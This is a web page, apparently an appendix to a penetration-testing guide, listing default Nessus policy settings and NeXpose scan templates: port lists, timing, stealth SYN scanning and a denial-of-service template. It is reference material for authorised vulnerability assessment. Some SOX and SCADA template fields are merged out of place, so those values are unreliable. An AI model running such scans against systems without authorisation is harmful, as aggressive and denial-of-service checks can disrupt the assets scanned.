|<u>'''Settings'''</u></p>
<p>|-
|Community name
|Public</p>
<p>|-
|UDP port
|161</p>
<p>|-
|SNMPv3 user name
|Blank</p>
<p>|-
|SNMPv3 authentication password
|Blank</p>
<p>|-
|SNMPv3 authentication algorithm
|MD5</p>
<p>|-
|SNMPv3 privacy password
|Blank</p>
<p>|-
|SNMPv3 privacy algorithm
|DES</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Service Detection'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Test SSL based services
|Known SSL ports</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Unix Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Web Application Tests Settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Enable web applications tests
|Checked</p>
<p>|-
|Maximum run time (min)
|1</p>
<p>|-
|Send POST requests
|Unchecked</p>
<p>|-
|Combinations of arguments values
|one value</p>
<p>|-
|HTTP Parameter Pollution
|Unchecked</p>
<p>|-
|Stop at first flaw
|Per port (quicker)</p>
<p>|-
|Test embedded web servers
|Unchecked</p>
<p>|-
|URL for Remote File Inclusion
|<a href="http://rfi.nessus.org/rfi.txt">http://rfi.nessus.org/rfi.txt</a></p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Web mirroring'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Number of pages to mirror
|0</p>
<p>|-
|Maximum depth
|0</p>
<p>|-
|Start page
|/</p>
<p>|-
|Excluded items regex
|<nowiki>*</nowiki><br></p>
<p>|-
|Follow dynamic pages
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Windows Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Windows File Contents Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|}</p>
<h1 id="appendix-e-nexpose-default-templates">Appendix E - NeXpose Default Templates</h1>
<h2 id="denial-of-service">Denial of service</h2>
<p>'''Description: '''This basic audit of all network assets uses both safe and unsafe (denial-of-service) checks. This scan does not include in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing.</p>
<p>'''Why use this template: '''You can run a denial of service scan in a preproduction environments to test the resistance of assets to denial-of service conditions.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''80</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''Local, patch, policy check types</p>
<h2 id="discovery-scan">Discovery scan</h2>
<p>'''Description: '''This scan locates live assets on the network and identifies their host names and operating systems. NeXpose does not perform enumeration, policy, or vulnerability scanning with this template.</p>
<p>'''Why use this template: '''You can run a discovery scan to compile a complete list of all network assets. Afterward, you can target subsets of these assets for intensive vulnerability scans, such as with the Exhaustive scan template.</p>
<p>'''Device/vulnerability scan: '''Y/N</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''21, 22, 23, 25, 80, 88, 110, 111, 135, 139, 143, 220, 264, 389, 443, 445, 449, 524, 585, 636, 993, 995, 1433, 1521, 1723, 3389, 8080, 9100</p>
<p>'''UDP ports used for device discovery: '''53,67,111,135,137,161,500,1701</p>
<p>'''Device discovery performance: '''5 ms send delay, 2 retries, 3000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''21, 22, 23, 25, 80, 110, 139, 143,220, 264, 443, 445, 449, 524, 585, 993, 995, 1433, 1521, 1723, 8080, 9100</p>
<p>'''TCP port scan performance: '''0 ms send delay, 25 blocks, 500 ms block delay, 3 retries</p>
<p>'''UDP ports to scan: '''161, 500</p>
<p>'''Simultaneous port scans: '''10</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="discovery-scan-aggressive">Discovery scan (aggressive)</h2>
<p>'''Description: '''This fast, cursory scan locates live assets on high-speed networks and identifies their host names and operating systems.  NeXpose sends packets at a very high rate, which may trigger IPS/IDS sensors, SYN flood protection, and exhaust states on stateful firewalls.  NeXpose does not perform enumeration, policy, or vulnerability scanning with this template.</p>
<p>'''Why use this template: '''This template is identical in scope to the discovery scan, except that it uses more threads and is, therefore, much faster. The tradeoff is that scans run with this template may not be as thorough as with the Discovery scan template.</p>
<p>'''Device/vulnerability scan: '''Y/N</p>
<p>'''Maximum # scan threads: '''25</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''21, 22, 23, 25, 80, 88, 110, 111, 135, 139, 143, 220, 264, 389, 443, 445, 449, 524, 585, 636, 993, 995, 1433, 1521, 1723, 3389, 8080, 9100</p>
<p>'''UDP ports used for device discovery: '''53, 67, 111, 135, 137, 161, 500, 1701</p>
<p>'''Device discovery performance: '''0 ms send delay, 2 retries, 3000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''21, 22, 23, 25, 80, 110, 139, 143, 220, 264, 443, 445, 449, 524, 585, 993, 995, 1433, 1521, 1723, 8080, 9100</p>
<p>'''TCP port scan performance: '''0 ms send delay, 25 blocks, 500 ms block delay, 3 retries</p>
<p>'''UDP ports to scan: '''161, 500</p>
<p>'''Simultaneous port scans: '''25</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="exhaustive">Exhaustive</h2>
<p>'''Description: '''This thorough network scan of all systems and services uses only safe checks, including patch/hotfix inspections, policy compliance assessments, and application-layer auditing. This scan could take several hours, or even days, to complete, depending on the number of target assets.</p>
<p>'''Why use this template: '''Scans run with this template are thorough, but slow. Use this template  to run intensive scans targeting a low number of assets.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>I'''CMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''80</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''NeXpose determines optimal method</p>
<p>'''TCP optimizer ports: '''21, 23, 25, 80, 110, 111, 135, 139, 443, 445, 449, 8080</p>
<p>'''TCP ports to scan: '''All possible (1-65535)</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="full-audit">Full audit</h2>
<p>'''Description: '''This full network audit of all systems uses only safe checks, including network-based vulnerabilities, patch/hotfix checking, and application-layer auditing. NeXpose scans only default ports and disables policy checking, which makes scans faster than with the Exhaustive scan. Also, NeXpose does not check for potential vulnerabilities with this template.</p>
<p>'''Why use this template: '''This is the default NeXpose scan template. Use it to run a fast, thorough vulnerability scan right "out of the box."</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''80</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''Policy check type</p>
<h2 id="hipaa-compliance">HIPAA compliance</h2>
<p>'''Description: '''NeXpose uses safe checks in this audit of compliance with HIPAA section 164.312 ("Technical Safeguards"). The scan will flag any conditions resulting in inadequate access control, inadequate auditing, loss of integrity, inadequate authentication, or inadequate transmission security (encryption) .</p>
<p>'''Why use this template: '''Use this template to scan assets in a HIPAA-regulated environment, as part of a HIPAA compliance program.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''80</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki></p>
<p>1-1040</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="internet-dmz-audit">Internet DMZ audit</h2>
<p>'''Description: '''This penetration test covers all common Internet services, such as Web, FTP, mail (SMTP/POP/IMAP/Lotus Notes), DNS, database, Telnet, SSH, and VPN. NeXpose does not perform in-depth patch/hotfix checking and policy compliance audits will not be performed.</p>
<p>'''Why use this template: '''Use this template to scan assets in your DMZ.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''N</p>
<p>'''TCP ports used for device discovery: '''None</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well-known numbers</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''None</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''DNS, database, FTP, Lotus Notes/Domino, Mail, SSH, TFTP, Telnet, VPN, Web check categories</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="linux-rpms">Linux RPMs</h2>
<p>'''Description: '''This scan verifies proper installation of RPM patches on Linux systems. For optimum success, use administrative credentials.</p>
<p>'''Why use this template: '''Use this template to scan assets running the Linux operating system.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum '''# scan threads: 10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''22, 23</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''22, 23</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''None</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''RPM check type</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="microsoft-hotfix">Microsoft hotfix</h2>
<p>'''Description: '''This scan verifies proper installation of hotfixes and service packs on Microsoft Windows systems. For optimum success, use administrative credentials.</p>
<p>'''Why use this template: '''Use this template to verify that assets running Windows have hotfix patches installed on them.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''135, 139, 445, 1433, 2400</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''135, 139, 445, 1433, 2433</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''None</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''Microsoft hotfix check type</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="payment-card-industry-pci-audit">Payment Card Industry (PCI) audit</h2>
<p>'''Description: '''This audit of Payment Card Industry (PCI) compliance uses only safe checks, including network-based vulnerabilities, patch/hotfix verification, and application-layer testing.  NeXpose scans all TCP ports and well-known UDP ports.  NeXpose does not perform policy checks.</p>
<p>'''Why use this template: '''Use this template to scan assets as part of a PCI compliance program.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''22, 23, 25, 80, 443</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''All possible (1-65535)</p>
<p>'''TCP port scan performance: '''1 ms send delay, 5 blocks, 15 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''Policy check types</p>
<h2 id="penetration-test">Penetration test</h2>
<p>'''Description: '''This in-depth scan of all systems uses only safe checks. Host-discovery and network penetration features allow NeXpose to dynamically detect assets that might not otherwise be detected. NeXpose does not perform in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing .</p>
<p>'''Why use this template: '''With this template, you may discover assets that are out of your initial scan scope.  Also, running a scan with this template is helpful as a precursor to conducting formal penetration test procedures.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''21, 22, 23, 25, 80, 443, 8080</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''NeXpose determines optimal method</p>
<p>'''TCP optimizer ports: '''21, 23, 25, 80, 110, 111, 135, 139, 443, 445, 449, 8080</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''Local, patch, policy check types</p>
<h2 id="penetration-test_1">Penetration test</h2>
<p>'''Description: '''This in-depth scan of all systems uses only safe checks.  Host-discovery and network penetration features allow NeXpose to dynamically detect assets that might not otherwise be detected.  NeXpose does not perform in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing.</p>
<p>'''Why use this template: '''With this template, you may discover assets that are out of your initial scan scope.  Also, running a scan with this template is helpful as a precursor to conducting formal penetration test procedures.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''21, 22, 23, 25, 80, 443, 8080</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''NeXpose determines optimal method</p>
<p>'''TCP optimizer ports: '''21, 23, 25, 80, 110, 111, 135, 139, 443, 445, 449, 8080</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''Local, patch, policy check types</p>
<h2 id="safe-network-audit">Safe network audit</h2>
<p>'''Description: '''This non-intrusive scan of all network assets uses only safe checks.  NeXpose does not perform in-depth patch/hotfix checking, policy compliance checking, or application-layer auditing.</p>
<p>'''Why use this template: '''This template is useful for a quick, general scan of your network.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''80</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks)''': None</p>
<p>'''Specific vulnerability checks disabled: '''Local, patch, policy check types</p>
<h2 id="sarbanes-oxley-sox-compliance">Sarbanes-Oxley (SOX) compliance</h2>
<p>'''Description: '''This is a safe-check</p>
<p>Sarbanes-Oxley (SOX) audit of all systems.  It detects threats to digital data integrity, data access auditing, accountability, and availability, as mandated in Section 302 ("Corporate Responsibility for Fiscal Reports"), Section 404 ("Management Assessment of Internal Controls"), and Section 409 ("Real Time Issuer Disclosures") respectively.</p>
<p>'''Why use this template: '''Use this template to scan assets as part of a SOX compliance program.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''80</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<h2 id="scada-audit">SCADA audit</h2>
<p>'''Description: '''This is a "polite," or less aggressive, network audit of sensitive Supervisory Control And Data Acquisition (SCADA) systems, using only safe checks.  Packet block delays have been increased; time between sent packets has been increased; protocol handshaking has been disabled; and simultaneous network access to assets has been restricted.</p>
<p>'''Why use this template: '''Use this template to scan SCADA systems.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''5</p>
<p>'''ICMP (Ping hosts): '''Y</p>
<p>'''TCP ports used for device discovery: '''None</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''10 ms send delay, 3 retries, 2000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well known numbers <nowiki>+</nowiki> 1-1040</p>
<p>'''TCP port scan performance: '''10 ms send delay, 10 blocks, 10 ms block delay, 4 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''Policy check type'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''Well-known numbers</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''None</p>
<p>'''Specific vulnerability checks disabled: '''None</p>
<h2 id="web-audit">Web audit</h2>
<p>'''Description: '''This audit of all Web servers and Web applications is suitable public-facing and internal assets, including application servers, ASP's, and CGI scripts.  NeXpose does not perform patch checking or policy compliance audits.  Nor does it scan FTP servers, mail servers, or database servers, as is the case with the DMZ Audit scan template.</p>
<p>'''Why use this template: '''Use this template to scan public-facing Web assets.</p>
<p>'''Device/vulnerability scan: '''Y/Y</p>
<p>'''Maximum # scan threads: '''10</p>
<p>'''ICMP (Ping hosts): '''N</p>
<p>'''TCP ports used for device discovery: '''None</p>
<p>'''UDP ports used for device discovery: '''None</p>
<p>'''Device discovery performance: '''5 ms send delay, 4 retries, 1000 ms block timeout</p>
<p>'''TCP port scan method: '''Stealth scan (SYN)</p>
<p>'''TCP optimizer ports: '''None</p>
<p>'''TCP ports to scan: '''Well-known numbers</p>
<p>'''TCP port scan performance: '''0 ms send delay, 10 blocks, 10 ms block delay, 5 retries</p>
<p>'''UDP ports to scan: '''None</p>
<p>'''Simultaneous port scans: '''5</p>
<p>'''Specific vulnerability checks enabled (which disables all other checks): '''Web category check</p>
<p>'''Specific vulnerability checks disabled: '''None</p></div>
        </div>

        <footer class="col-md-12">
            <hr>
                <p>Copyright &copy; 2019 - 2020 darkcode0x00</p>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script>
            var base_url = "../..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../../js/base.js" defer></script>
        <script src="../../search/main.js" defer></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
            </div>
            <div class="modal-body">
                <p>
                    From here you can search these documents. Enter
                    your search terms below.
                </p>
                <form role="form">
                    <div class="form-group">
                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
